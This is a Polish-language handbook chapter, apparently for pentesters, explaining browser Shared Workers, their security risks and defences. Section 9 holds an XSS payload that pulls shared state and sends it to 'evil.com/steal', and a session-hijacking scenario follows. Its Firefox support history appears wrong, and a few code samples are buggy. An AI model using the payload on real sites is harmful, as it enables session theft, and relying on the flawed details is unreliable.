# Rozdział 21: Shared Workers

## 1. Czym są Shared Workers

**Shared Workers** to specjalny rodzaj Web Workerów, które mogą być **współdzielone przez wiele kontekstów przeglądania** (karty, okna, iframes) tego samego origin. W odróżnieniu od Dedicated Workers (jeden Worker = jeden kontekst), Shared Worker istnieje jako singleton per origin+URL — wszystkie karty z tego samego origin odwołujące się do tego samego pliku SW współdzielą tę samą instancję.

Kluczowe cechy:
- Singleton per origin + URL Workera
- Komunikacja przez obiekt `MessagePort` (a nie bezpośrednio przez Worker reference)
- Dostęp do wszystkich połączonych kontekstów przez `self.onconnect`
- Działa tak długo jak istnieje co najmniej jeden połączony kontekst
- Brak dostępu do DOM (jak każdy Worker)

Shared Workers są rzadko używane w nowoczesnych aplikacjach — BroadcastChannel (Rozdział 22) i Service Workers (Rozdział 19) pokrywają większość ich use cases. Firefox usunął wsparcie dla Shared Workers w 2015 a przywrócił w 2019.

---

## 2. Dlaczego powstał

### Problem: koordinacja między kartami

Przed Shared Workers koordynacja między kartami tego samego origin była możliwa przez:
- `localStorage` + `StorageEvent` (ograniczone, synchroniczne)
- Polling przez serwer (nieefektywne)
- Brak możliwości shared computations

Shared Workers miały umożliwić:
- Wspólne połączenie WebSocket dla wszystkich kart
- Centralne zarządzanie stanem (np. koszyk zakupowy)
- Shared computations bez powielania obliczeń w każdej karcie

---

## 3. Jak działa

### Model komunikacji

```
Karta 1 (app.example.com)          Karta 2 (app.example.com)
        │                                    │
        │ new SharedWorker('sw.js') ──►      │
        │                          ◄──────── │ new SharedWorker('sw.js')
        │                                    │ (ta sama instancja!)
        │           ┌──────────────────────────────────┐
        │           │    Shared Worker (singleton)     │
        │ port1 ◄──►│◄──► port1 (Karta 1)             │
        │           │◄──► port2 (Karta 2)             │
        │           │                                  │
        │           │ self.onconnect: obsługuje porty  │
        │           └──────────────────────────────────┘
```

### API

```javascript
// W każdym kontekście (strona/karta)
const worker = new SharedWorker('/shared-worker.js');
const port = worker.port; // MessagePort

// Musi być jawnie uruchomiony lub przez onmessage
port.start(); // lub automatycznie przez port.onmessage = ...

// Wyślij wiadomość
port.postMessage({ action: 'subscribe', channel: 'prices' });

// Odbierz
port.onmessage = (event) => {
    console.log('Od Shared Worker:', event.data);
};

// Obsługa błędów
worker.onerror = (err) => console.error('SW Error:', err);
```

```javascript
// shared-worker.js (Shared Worker context)
const ports = new Set(); // wszystkie połączone porty

self.onconnect = (event) => {
    const port = event.ports[0]; // nowe połączenie
    ports.add(port);
    
    port.start();
    
    port.onmessage = (event) => {
        const { action, data } = event.data;
        
        // Broadcast do wszystkich połączonych kontekstów
        if (action === 'broadcast') {
            ports.forEach(p => {
                if (p !== port) p.postMessage({ type: 'broadcast', data });
            });
        }
        
        // Odpowiedz tylko do tej karty
        port.postMessage({ type: 'ack', received: action });
    };
    
    // Gdy karta zamknięta — port się rozłącza
    // UWAGA: nie ma automatycznego eventu "disconnect"
    // Trzeba obsłużyć to przez heartbeat lub close event (w niektórych przeglądarkach)
};
```

---

## 4. Co dzieje się wewnętrznie

### Identyfikacja instancji

Shared Worker jest identyfikowany przez **URL skryptu + origin**. Ten sam URL na tym samym origin = ta sama instancja. Inne URL lub inny origin = inna instancja.

```javascript
// Te dwie linijki dają TĘ SAMĄ instancję:
new SharedWorker('/shared-worker.js');
new SharedWorker('/shared-worker.js');

// Różne instancje (różny URL):
new SharedWorker('/worker-a.js');
new SharedWorker('/worker-b.js');

// Możliwe nadanie nazwy — ta sama nazwa + URL = ta sama instancja:
new SharedWorker('/worker.js', { name: 'my-shared-worker' });
```

### Lifetime

Shared Worker żyje tak długo jak istnieje co najmniej jeden połączony kontekst (port). Gdy ostatnia karta jest zamknięta → Worker zostaje usunięty.

To różni Shared Workers od Service Workers (które mogą działać w tle bez połączeń).

### Brak disconnect event

Gdy karta jest zamknięta, port się rozłącza. Ale **Shared Worker nie dostaje automatycznego powiadomienia** o rozłączeniu portu. Musisz implementować heartbeat lub podobny mechanizm:

```javascript
// Obsługa "disconnect" przez heartbeat
const ports = new Map(); // port → lastSeen

self.onconnect = ({ ports: [port] }) => {
    ports.set(port, Date.now());
    port.start();
    
    port.onmessage = ({ data }) => {
        if (data === 'ping') {
            ports.set(port, Date.now());
            port.postMessage('pong');
        }
    };
};

// Usuń nieaktywne porty
setInterval(() => {
    const now = Date.now();
    for (const [port, lastSeen] of ports) {
        if (now - lastSeen > 10000) { // 10 sekund bez pingu
            ports.delete(port);
        }
    }
}, 5000);
```

---

## 5. Analogiczny przykład z życia

Shared Workers to recepcja hotelowa:

- Hotel (origin) ma jedną recepcję (Shared Worker singleton)
- Każdy gość (karta) może podejść do recepcji i porozmawiać (port.postMessage)
- Recepcja może przekazać wiadomość od jednego gościa do wszystkich (broadcast)
- Gdy wszyscy goście wymeldują się (karty zamknięte) → recepcja zamykana (Worker zakończony)
- Różne hotele (origins) mają własne recepcje — brak współdzielenia między origins

---

## 6. Przykład kodu

```javascript
// === Shared Worker jako wspólny WebSocket hub ===

// shared-websocket.js
let socket = null;
const clients = new Set();
let reconnectTimer = null;

function connect() {
    socket = new WebSocket('wss://api.example.com/stream');
    
    socket.onmessage = ({ data }) => {
        // Rozgłoś do wszystkich kart
        const message = JSON.parse(data);
        clients.forEach(port => port.postMessage(message));
    };
    
    socket.onclose = () => {
        // Reconnect po 3 sekundach
        reconnectTimer = setTimeout(connect, 3000);
    };
    
    socket.onerror = (err) => {
        clients.forEach(port => port.postMessage({ type: 'error', error: err.message }));
    };
}

self.onconnect = ({ ports: [port] }) => {
    clients.add(port);
    port.start();
    
    // Jeśli pierwszy klient — nawiąż połączenie
    if (clients.size === 1) {
        connect();
    }
    
    port.onmessage = ({ data }) => {
        if (data.type === 'send' && socket?.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify(data.payload));
        }
    };
    
    // Cleanup (nie ma autom. disconnect — karta musi powiedzieć)
    port.onmessageerror = () => clients.delete(port);
};
```

```javascript
// main.js (w każdej karcie)
const worker = new SharedWorker('/shared-websocket.js');
const port = worker.port;
port.start();

port.onmessage = ({ data }) => {
    console.log('WebSocket message (przez Shared Worker):', data);
    updateUI(data);
};

// Wyślij wiadomość przez WebSocket
port.postMessage({ type: 'send', payload: { action: 'subscribe', topic: 'prices' } });

// Cleanup przy zamknięciu karty (pomoże Workerowi wiedzieć że odchodzimy)
window.addEventListener('beforeunload', () => {
    port.postMessage({ type: 'disconnect' });
});
```

---

## 7. Przykład z prawdziwej aplikacji

### Shared state — koszyk zakupowy per origin

```javascript
// cart-worker.js
const state = { cart: [], totalItems: 0 };
const subscribers = new Set();

function broadcast(type, data) {
    subscribers.forEach(port => port.postMessage({ type, data }));
}

self.onconnect = ({ ports: [port] }) => {
    subscribers.add(port);
    port.start();
    
    // Wyślij aktualny stan przy połączeniu
    port.postMessage({ type: 'init', data: state });
    
    port.onmessage = ({ data: msg }) => {
        switch (msg.type) {
            case 'add':
                state.cart.push(msg.item);
                state.totalItems++;
                broadcast('update', state);
                break;
            case 'remove':
                state.cart = state.cart.filter(i => i.id !== msg.id);
                state.totalItems = state.cart.length;
                broadcast('update', state);
                break;
            case 'get':
                port.postMessage({ type: 'state', data: state });
                break;
        }
    };
};
```

---

## 8. Typowe błędy programistów

### Błąd 1: Zapominanie port.start()

```javascript
// BŁĄD: bez port.start() lub onmessage handler — messages się kolejkują i nie są dostarczane
const worker = new SharedWorker('/worker.js');
worker.port.postMessage('hello'); // Message wysłana ale nigdy odebrana!

// POPRAWKA: zawsze start() lub ustaw onmessage (automatycznie startuje port)
worker.port.start();
worker.port.postMessage('hello');
// LUB:
worker.port.onmessage = handler; // automatycznie start
worker.port.postMessage('hello');
```

### Błąd 2: Wyciek portów (brak cleanup)

```javascript
// BŁĄD w Shared Worker — porty nigdy nie są usuwane ze Set
const ports = new Set();
self.onconnect = ({ ports: [p] }) => {
    ports.add(p); // nigdy nie usuwamy!
    // Jeśli karta zamknięta → port staje się zombi
    // Próba postMessage do zamkniętego portu → silent failure lub błąd
};

// POPRAWKA: heartbeat lub close event
self.onconnect = ({ ports: [p] }) => {
    ports.add(p);
    p.start();
    p.onmessage = ({ data }) => {
        if (data === 'close') ports.delete(p);
    };
};
// I karta wysyła 'close' w beforeunload
```

---

## 9. Znaczenie dla bezpieczeństwa

### Współdzielony stan a izolacja między kartami

Shared Worker łamie per-tab izolację celowo. To ma implikacje bezpieczeństwa:

```javascript
// Scenariusz: karta bankowa i karta z social media otwarte na tym samym origin
// NIEMOŻLIWE: inne origins nie mogą łączyć się do tego samego Shared Worker

// ALE: jeśli obie karty są na TYM SAMYM origin (np. bank.com):
// Karta 1 (bank.com/account) → Shared Worker
// Karta 2 (bank.com/promotions) → TEN SAM Shared Worker
// Jeśli karta 2 jest podatna na XSS → może komunikować się przez SW z kartą 1
```

### Shared Worker jako cross-tab data channel

XSS na jednej karcie może przez Shared Worker wpływać na inne karty:

```javascript
// XSS na bank.com/news (karta 2):
const worker = new SharedWorker('/shared-state.js');
worker.port.start();
worker.port.postMessage({ action: 'getState' }); // pobierz stan z kart y 1
worker.port.onmessage = ({ data }) => {
    // data może zawierać tokeny, sessję z karty 1!
    fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(data)), {
        mode: 'no-cors'
    });
};
```

### Brak mechanizmu autentykacji portów

Shared Worker nie ma możliwości weryfikacji skąd pochodzi port. Każda karta tego samego origin może się połączyć. Jeśli jedna karta jest skompromitowana przez XSS → Shared Worker staje się wektorem ataku na inne karty.

### Powiązane CWE

- **CWE-284** — Improper Access Control (cross-tab state access)
- **CWE-79** — XSS (wektor ataku przez Shared Worker)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Sources → Threads

1. **Sources** → **Threads** (lewy panel) → szukaj "Shared Workers"
2. Możesz debugować Shared Worker bezpośrednio
3. Console → zmień kontekst na Shared Worker

### Network Tab

```
Szukaj requestów do plików JS ładowanych jako Shared Worker:
- Filtruj po 'JS' w Network → sprawdź inicjator (Initiator)
- Lub: grep za 'new SharedWorker' w source JS
```

### Console (w kontekście Shared Worker)

```javascript
// W konsoli Shared Worker (przez DevTools):
clients.size; // ile połączonych portów?
ports.forEach(p => console.log(p)); // podejrzyj porty
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy Shared Worker przechowuje wrażliwe dane dostępne przez wszystkie karty?
□ Czy port authentication jest implementowany (kto może się połączyć)?
□ Czy XSS na jednej karcie może wpłynąć na inne karty przez Shared Worker?
□ Czy Shared Worker jest czyszczony przy wylogowaniu?
□ Czy komunikacja przez Shared Worker jest walidowana?
□ Czy Shared Worker ma dostęp do IndexedDB/localStorage z danymi sesji?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: Cross-tab XSS amplification

```
1. Aplikacja używa Shared Worker do synchronizacji tokenu sesji między kartami
2. XSS na bank.com/news (mniej chroniona strona)
3. XSS payload łączy się do Shared Worker
4. Pobiera token sesji z karty bank.com/account (lepsza strona)
5. Eksfiltruje token → session hijacking
```

---

## 13. Jak się zabezpieczać

```javascript
// 1. Nie przechowuj wrażliwych danych w Shared Worker
// Shared Worker dostępny dla WSZYSTKICH kart tego origin

// 2. Waliduj komunikaty
self.onconnect = ({ ports: [port] }) => {
    port.start();
    port.onmessage = ({ data }) => {
        // Whitelist dozwolonych akcji
        const ALLOWED = ['subscribe', 'unsubscribe', 'ping'];
        if (!ALLOWED.includes(data.action)) return;
        handleAction(data);
    };
};

// 3. Rozważ BroadcastChannel zamiast Shared Worker (prostsze, mniej attack surface)
// Rozdział 22

// 4. Czyść stan przy wylogowaniu
// Z głównego wątku wyślij do wszystkich połączonych Shared Workers:
sharedWorker.port.postMessage({ action: 'logout' });
// W Worker:
if (msg.action === 'logout') {
    state = {}; // wyczyść stan
    clients.forEach(p => p.postMessage({ type: 'logout' }));
}
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Shared Worker = singleton per (URL + origin), współdzielony przez karty
2. Komunikacja przez MessagePort (nie bezpośrednio przez Worker reference)
3. Brak automatycznego disconnect event — wymaga heartbeat dla cleanup
4. Rzadko używany w nowoczesnych aplikacjach — BroadcastChannel zastępuje
5. Główne zagrożenie: XSS na jednej karcie → dostęp do danych wszystkich kart

**Dla pentestera:**
- Sources → Threads w DevTools — szukaj Shared Workers
- Sprawdź czy SW przechowuje tokeny/sessje dostępne cross-tab
- XSS + Shared Worker = możliwy cross-tab data leak

---

## Powiązania

```
Shared Workers
    │
    ├──► Web Workers (Rozdział 20)
    │         Dedicated Worker — baz a Shared Workers
    │
    ├──► BroadcastChannel (Rozdział 22)
    │         Prostszy mechanizm cross-tab komunikacji
    │         Nie wymaga singleton Worker
    │
    ├──► MessageChannel / postMessage (Rozdziały 24, 23)
    │         Bazowy mechanizm komunikacji używany w Workers
    │
    └──► Service Workers (Rozdział 19)
              SW kontroluje sieć, Shared Worker — shared computations
```
